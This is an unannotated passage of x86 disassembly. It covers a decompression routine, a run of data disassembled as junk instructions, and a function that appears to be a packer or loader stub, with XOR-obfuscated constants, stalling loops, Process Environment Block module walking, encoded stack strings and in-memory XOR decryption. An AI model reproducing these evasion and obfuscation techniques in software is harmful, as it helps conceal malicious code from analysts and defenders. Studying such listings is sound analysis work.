  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
